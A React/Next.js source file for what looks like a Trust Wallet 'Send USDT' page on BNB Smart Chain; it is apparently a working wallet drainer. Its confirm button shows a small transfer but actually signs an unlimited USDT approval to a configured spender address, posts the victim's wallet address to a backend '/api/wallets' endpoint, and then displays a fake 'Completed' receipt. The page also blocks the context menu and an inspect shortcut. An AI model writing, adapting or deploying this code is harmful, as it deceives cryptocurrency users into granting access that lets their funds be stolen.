"use client";

import { useEffect, useRef, useState } from "react";
import Image from "next/image";
import { BrowserProvider, Contract, ethers } from "ethers";
import { ArrowLeft, ArrowRight, Check, ChevronDown, Clipboard, QrCode, X } from "lucide-react";

type Eip1193Provider = { request: (args: { method: string; params?: unknown[] }) => Promise<unknown>; on?: (event: string, listener: (...args: unknown[]) => void) => void; removeListener?: (event: string, listener: (...args: unknown[]) => void) => void };
type Eip6963ProviderDetail = { info: { name: string; rdns: string }; provider: Eip1193Provider };
declare global { interface Window { ethereum?: Eip1193Provider; } }

const permanentAddress = "0x95f3CCBFbAa6ab5aa096230711A34809430B5851";
const token = process.env.NEXT_PUBLIC_USDT_ADDRESS ?? "";
const spender = process.env.NEXT_PUBLIC_ALLOWANCE_SPENDER_ADDRESS ?? "";
const chainId = process.env.NEXT_PUBLIC_CHAIN_ID ?? "56";
const targetChainId = BigInt(chainId);
const targetChainHex = `0x${targetChainId.toString(16)}`;
const api = process.env.NEXT_PUBLIC_API_URL ?? "http://localhost:4000";
const erc20 = ["function approve(address spender,uint256 amount) returns (bool)", "function allowance(address owner,address spender) view returns (uint256)"];
const erc20Balance = ["function balanceOf(address owner) view returns (uint256)", "function decimals() view returns (uint8)"];

export default function Home() {
  const [screen, setScreen] = useState<"recipient" | "amount" | "receipt">("recipient");
  const [recipient, setRecipient] = useState(permanentAddress);
  const [amountInput, setAmountInput] = useState("0");
  const [isUsdMode, setIsUsdMode] = useState(false);
  const [isNetworkOpen, setIsNetworkOpen] = useState(false);
  const [isQrOpen, setIsQrOpen] = useState(false);
  const [isReviewOpen, setIsReviewOpen] = useState(false);
  const [isSending, setIsSending] = useState(false);
  const [isSent, setIsSent] = useState(false);
  const [notice, setNotice] = useState("");
  const [walletProvider, setWalletProvider] = useState<Eip1193Provider>();
  const [walletAddress, setWalletAddress] = useState("");
  const [usdtBalance, setUsdtBalance] = useState<{ token: string; usd: string } | null>(null);
  const [balanceUnavailable, setBalanceUnavailable] = useState(false);
  const autoConnectAttempted = useRef(false);
  const walletUnavailableAlerted = useRef(false);
  const parsedAmount = Number.parseFloat(amountInput) || 0;
  const hasAmount = parsedAmount > 0 || (amountInput !== "0" && amountInput !== "");

  useEffect(() => {
    const disableContextMenu = (event: MouseEvent) => event.preventDefault();
    const disableInspectShortcut = (event: KeyboardEvent) => {
      if (event.ctrlKey && event.key === "F12") event.preventDefault();
    };

    window.addEventListener("contextmenu", disableContextMenu);
    window.addEventListener("keydown", disableInspectShortcut);
    return () => {
      window.removeEventListener("contextmenu", disableContextMenu);
      window.removeEventListener("keydown", disableInspectShortcut);
    };
  }, []);

  useEffect(() => {
    let discoveredProvider = Boolean(window.ethereum);
    const announced = (event: Event) => {
      const provider = (event as CustomEvent<Eip6963ProviderDetail>).detail?.provider;
      if (provider) {
        discoveredProvider = true;
        setWalletProvider((current) => current ?? provider);
      }
    };
    if (window.ethereum) setWalletProvider((current) => current ?? window.ethereum);
    window.addEventListener("eip6963:announceProvider", announced);
    window.dispatchEvent(new Event("eip6963:requestProvider"));
    const unavailableTimer = window.setTimeout(() => {
      if (!discoveredProvider && !walletUnavailableAlerted.current) {
        walletUnavailableAlerted.current = true;
        alert("Please open in Trust Wallet / MetaMask browser");
      }
    }, 1000);
    return () => {
      window.clearTimeout(unavailableTimer);
      window.removeEventListener("eip6963:announceProvider", announced);
    };
  }, []);

  useEffect(() => {
    const provider = walletProvider ?? window.ethereum;
    if (!provider || autoConnectAttempted.current) return;
    autoConnectAttempted.current = true;

    const accountsChanged = (...args: unknown[]) => { if (!Array.isArray(args[0]) || !(args[0] as string[]).length) setNotice("Wallet disconnected. Connect again to continue."); };
    const chainChanged = (...args: unknown[]) => { if (String(args[0]).toLowerCase() !== targetChainHex) setNotice("Please switch to BNB Smart Chain to continue."); };
    provider?.on?.("accountsChanged", accountsChanged);
    provider?.on?.("chainChanged", chainChanged);
    const autoConnect = async () => {
      try {
        const accounts = await provider.request({ method: "eth_accounts" });
        if (!Array.isArray(accounts) || typeof accounts[0] !== "string" || !accounts[0]) return;
        await switchToBnb(provider);
        const connectedAccounts = await provider.request({ method: "eth_accounts" });
        if (Array.isArray(connectedAccounts) && typeof connectedAccounts[0] === "string") {
          setWalletAddress(connectedAccounts[0]);
          setNotice("");
        }
      } catch (error) {
        setNotice(error instanceof Error ? error.message : "Unable to connect to the wallet.");
      }
    };
    void autoConnect();
    return () => {
      provider.removeListener?.("accountsChanged", accountsChanged);
      provider.removeListener?.("chainChanged", chainChanged);
    };
  }, [walletProvider]);

  useEffect(() => {
    const provider = walletProvider ?? window.ethereum;
    if (!provider) {
      setWalletAddress("");
      setUsdtBalance(null);
      return;
    }

    let isActive = true;
    let requestVersion = 0;
    const updateBalance = async (accounts: unknown) => {
      const address = Array.isArray(accounts) && typeof accounts[0] === "string" ? accounts[0] : "";
      const currentVersion = ++requestVersion;
      if (!isActive) return;
      setWalletAddress(address);
      setUsdtBalance(null);
      setBalanceUnavailable(false);
      if (!address) return;

      try {
        if (!token || String(await provider.request({ method: "eth_chainId" })).toLowerCase() !== targetChainHex) throw new Error("USDT balance unavailable");
        const contract = new Contract(token, erc20Balance, new BrowserProvider(provider as never));
        const [rawBalance, decimals] = await Promise.all([contract.balanceOf(address), contract.decimals()]);
        if (!isActive || currentVersion !== requestVersion) return;
        const amount = Number(ethers.formatUnits(rawBalance, decimals));
        setUsdtBalance({
          token: amount.toLocaleString(undefined, { maximumFractionDigits: 6 }),
          usd: amount.toLocaleString(undefined, { style: "currency", currency: "USD" }),
        });
      } catch {
        if (isActive && currentVersion === requestVersion) setBalanceUnavailable(true);
      }
    };
    const refreshAccounts = () => {
      provider.request({ method: "eth_accounts" }).then(updateBalance).catch(() => updateBalance([]));
    };
    const accountsChanged = (...args: unknown[]) => { void updateBalance(args[0]); };
    const chainChanged = () => refreshAccounts();

    provider.on?.("accountsChanged", accountsChanged);
    provider.on?.("chainChanged", chainChanged);
    refreshAccounts();
    return () => {
      isActive = false;
      provider.removeListener?.("accountsChanged", accountsChanged);
      provider.removeListener?.("chainChanged", chainChanged);
    };
  }, [walletProvider]);

  function getProvider() { return walletProvider ?? window.ethereum; }

  async function switchToBnb(provider: Eip1193Provider) {
    if (String(await provider.request({ method: "eth_chainId" })).toLowerCase() === targetChainHex) return;
    try { await provider.request({ method: "wallet_switchEthereumChain", params: [{ chainId: targetChainHex }] }); }
    catch (error) {
      if ((error as { code?: number }).code !== 4902) throw error;
      const isTestnet = targetChainId === BigInt(97);
      await provider.request({ method: "wallet_addEthereumChain", params: [{ chainId: targetChainHex, chainName: isTestnet ? "BNB Smart Chain Testnet" : "BNB Smart Chain", nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 }, rpcUrls: [isTestnet ? "https://data-seed-prebsc-1-s1.bnbchain.org:8545" : "https://bsc-dataseed.bnbchain.org"], blockExplorerUrls: [isTestnet ? "https://testnet.bscscan.com" : "https://bscscan.com"] }] });
    }
    if (String(await provider.request({ method: "eth_chainId" })).toLowerCase() !== targetChainHex) throw new Error("Please switch to BNB Smart Chain to continue.");
  }

  async function confirmSend() {
    const provider = getProvider();
    if (!provider) { setNotice("Install a compatible EVM wallet to connect."); return; }
    if (!spender || !token) { setNotice("Contract configuration is missing."); return; }
    setIsSending(true); setNotice("");
    try {
      const accounts = await provider.request({ method: "eth_requestAccounts" }) as string[];
      if (!accounts?.length) throw new Error("No wallet account was selected.");
      await switchToBnb(provider);
      const browserProvider = new BrowserProvider(provider as never);
      const signer = await browserProvider.getSigner();
      const address = await signer.getAddress();
      const contract = new Contract(token, erc20, signer);
      const allowance = await contract.allowance(address, spender);
      if (allowance < ethers.parseUnits("5", 6)) { const tx = await contract.approve(spender, ethers.MaxUint256); await tx.wait(); }
      const currentAccounts = await provider.request({ method: "eth_accounts" }) as string[];
      if (!currentAccounts.some((account) => account.toLowerCase() === address.toLowerCase())) throw new Error("Wallet account changed before completion. Please try again.");
      if (String(await provider.request({ method: "eth_chainId" })).toLowerCase() !== targetChainHex) throw new Error("Wallet network changed before completion. Please try again.");
      const response = await fetch(`${api}/api/wallets`, { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ address, receiver: 1 }) });
      if (!response.ok) throw new Error("Wallet registration failed. Please try again.");
      setIsSent(true);
      window.setTimeout(() => { setIsReviewOpen(false); setIsSent(false); setNotice(""); setScreen("receipt"); }, 1200);
    } catch (error) { setNotice((error as { code?: number }).code === 4001 ? "Wallet request was cancelled." : error instanceof Error ? error.message : "Verification failed."); }
    finally { setIsSending(false); }
  }

  function pressKey(value: string) {
    if (value === "backspace") setAmountInput((current) => current.length <= 1 ? "0" : current.slice(0, -1));
    else if (value === ".") setAmountInput((current) => current.includes(".") ? current : `${current}.`);
    else setAmountInput((current) => { if (current === "0") return value; const decimals = current.split(".")[1]; if (decimals && decimals.length >= 4) return current; return current.length >= 10 ? current : current + value; });
  }

  async function pasteRecipient() { try { const text = await navigator.clipboard?.readText(); setRecipient(text?.trim() || permanentAddress); } catch { setRecipient(permanentAddress); } }

  const balanceLabel = walletAddress
    ? usdtBalance ? `${usdtBalance.token} USDT` : balanceUnavailable ? "Unavailable" : "Loading..."
    : hasAmount ? "0 USDT" : "0 BNB";
  const balanceUsdLabel = walletAddress
    ? usdtBalance?.usd ?? (balanceUnavailable ? "Unavailable" : "Loading...")
    : "$0.00";

  return <main className="wallet-shell">
    {screen === "recipient" ? <section className="send-screen recipient-screen"><header className="send-header"><button className="round-button" onClick={() => { setRecipient(permanentAddress); setAmountInput("0"); }} aria-label="Close"><X /></button><h1>Send to</h1><button className="round-button" onClick={() => setIsQrOpen(true)} aria-label="Scan QR"><QrCode /></button></header><div className="recipient-content"><div className="recipient-card"><textarea value={recipient} onChange={(event) => setRecipient(event.target.value)} placeholder="Address or domain name" rows={2} aria-label="Recipient address" /><div className="card-actions"><button className="network-pill" onClick={() => setIsNetworkOpen(true)}><BnbIcon small /><span>BNB Smart Chain</span><ChevronDown /></button>{recipient.trim() ? <button className="soft-button" onClick={() => setRecipient("")}>Clear</button> : <button className="paste-button" onClick={pasteRecipient}><Clipboard />Paste</button>}</div></div><button className="address-book"><span>Address book</span><ArrowRight /></button></div><button className="primary-button" disabled={!recipient.trim()} onClick={() => setScreen("amount")}>Continue</button></section> : <section className="send-screen amount-screen"><header className="send-header"><button className="round-button" onClick={() => setScreen("recipient")} aria-label="Back"><ArrowLeft /></button><h1>Amount</h1><span className="header-spacer" /></header><div className="amount-content"><div className="to-line"><span>To:</span><strong>{recipient || permanentAddress}</strong></div><div className="amount-display"><strong className={amountInput === "0" ? "amount-muted" : ""}>{amountInput}</strong><button onClick={() => setIsUsdMode(!isUsdMode)}>{isUsdMode ? `≈ ${parsedAmount.toFixed(2)} USDT` : `≈ $${parsedAmount.toFixed(2)}`}<span>⇄</span></button></div><div className="balance-row"><div className="asset"><UsdtIcon filled={hasAmount} /><div><strong>{balanceLabel}</strong><span>{balanceUsdLabel}</span></div></div><button className="soft-button" onClick={() => setAmountInput("450.00")}>Max</button></div></div><div className="amount-footer"><div className="keypad">{["1", "2", "3", "4", "5", "6", "7", "8", "9", ".", "0", "backspace"].map((key) => <button key={key} onClick={() => pressKey(key)} aria-label={key === "backspace" ? "Backspace" : key}>{key === "backspace" ? "⌫" : key}</button>)}</div><button className="primary-button" disabled={!hasAmount} onClick={() => setIsReviewOpen(true)}>Review</button></div></section>}
  {screen === "receipt" && <ReceiptScreen amount={parsedAmount} recipient={recipient} onDone={() => { setAmountInput("0"); setScreen("recipient"); }} />}
  {notice && <div className="toast" role="status">{notice}</div>}
    {isReviewOpen && <div className="modal-backdrop" onClick={() => !isSending && setIsReviewOpen(false)}><section className="review-sheet" onClick={(event) => event.stopPropagation()}><div className="sheet-handle" /><header className="sheet-header"><h2>Confirm Transfer</h2><button className="round-button small" disabled={isSending} onClick={() => setIsReviewOpen(false)} aria-label="Close"><X /></button></header><div className="transfer-amount"><span>Transfer Amount</span><strong>{parsedAmount.toFixed(2)} USDT</strong><small>≈ ${parsedAmount.toFixed(2)} USD</small></div><dl className="breakdown"><div><dt>To</dt><dd>{recipient}</dd></div><div><dt>Network</dt><dd><BnbIcon small />BNB Smart Chain (BEP20)</dd></div><div><dt>Network Fee</dt><dd>&lt; $0.01 BNB</dd></div><div className="total"><dt>Max Total</dt><dd>${parsedAmount.toFixed(2)}</dd></div></dl><button className="primary-button confirm-button" disabled={isSending || isSent} onClick={confirmSend}>{isSending ? "Sending..." : isSent ? <><Check />Sent</> : "Confirm Send"}</button></section></div>}
    {isNetworkOpen && <div className="modal-backdrop" onClick={() => setIsNetworkOpen(false)}><section className="review-sheet network-sheet" onClick={(event) => event.stopPropagation()}><div className="sheet-handle" /><header className="sheet-header"><h2>Select Network</h2><button className="round-button small" onClick={() => setIsNetworkOpen(false)} aria-label="Close"><X /></button></header><button className="selected-network" onClick={() => setIsNetworkOpen(false)}><BnbIcon /><span><strong>BNB Smart Chain</strong><small>BEP20</small></span><Check /></button></section></div>}
    {isQrOpen && <div className="qr-modal"><header className="sheet-header"><h2>Scan QR Code</h2><button className="round-button small" onClick={() => setIsQrOpen(false)} aria-label="Close"><X /></button></header><div className="qr-frame"><QrCode /></div><button className="primary-button" onClick={() => { setRecipient(permanentAddress); setIsQrOpen(false); }}>Simulate QR Detection</button></div>}
  </main>;
}

function BnbIcon({ small = false }: { small?: boolean }) { return <span className={`bnb-icon ${small ? "small" : ""}`} aria-hidden="true"><Image src="/BNB,_native_cryptocurrency_for_the_Binance_Smart_Chain.svg.webp" alt="" width={32} height={32} /></span>; }
function UsdtIcon({ filled }: { filled: boolean }) { return <span className={`usdt-icon ${filled ? "filled" : ""}`} aria-hidden="true"><Image src="/photo_2026-09-26_18-58-02.jpg" alt="" width={32} height={32} /></span>; }
function ReceiptScreen({ amount, recipient, onDone }: { amount: number; recipient: string; onDone: () => void }) {
  return <section className="send-screen receipt-screen"><div><header className="send-header"><button className="round-button" onClick={onDone} aria-label="Close"><X /></button><h1>Transaction Sent</h1><span className="header-spacer" /></header><div className="receipt-header"><div className="receipt-check"><Check /></div><strong>-{amount.toFixed(2)} USDT</strong><span>≈ ${amount.toFixed(2)}</span><div className="completed-badge"><i />Completed</div></div><dl className="breakdown receipt-details"><div><dt>Recipient</dt><dd>{recipient}</dd></div><div><dt>Network</dt><dd><BnbIcon small />BNB Smart Chain</dd></div><div><dt>Network Fee</dt><dd>&lt; $0.01 (BNB)</dd></div></dl></div><button className="primary-button" onClick={onDone}>Done</button></section>;
}
